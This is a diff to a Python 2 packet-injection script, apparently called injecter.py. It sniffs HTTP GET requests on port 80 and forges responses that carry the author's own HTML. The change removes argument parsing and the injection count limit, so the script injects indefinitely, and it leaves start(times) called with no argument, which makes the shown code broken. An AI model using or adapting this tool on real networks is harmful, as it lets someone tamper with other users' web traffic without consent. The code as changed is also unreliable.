@@ -11,32 +11,12 @@ page = open(path, 'r') # open file containing html
 html = page.read() # get html
 default_value = 10
 
-
-def print_usage():
-    print "USAGE: injecter.py number_of_injections"
-
-    
-def parse_args():
-    if len(sys.argv) == 1: # default value
-        return default_value
-    
-    if len(sys.argv) != 2:
-        print_usage()
-        sys.exit(1)
-
-    try:
-        return int(sys.argv[1])
-    except:
-        print_usage()
-        sys.exit(1)
-
 def start(times):
     print "Listening for http GET requests..."
     
     sniff(prn=inject,
           filter='tcp port 80', # http
-          lfilter=lambda p: 'GET' in str(p), # is a GET request
-          count=times
+          lfilter=lambda p: 'GET' in str(p) # is a GET request
     ) 
 
 def inject(p): # got packet, inject my html
@@ -61,4 +41,4 @@ def forge_response(p):
     my_packet = ether / ip / tcp / response # forge response packet with my html in it
     return my_packet
     
-start(parse_args())
+start()
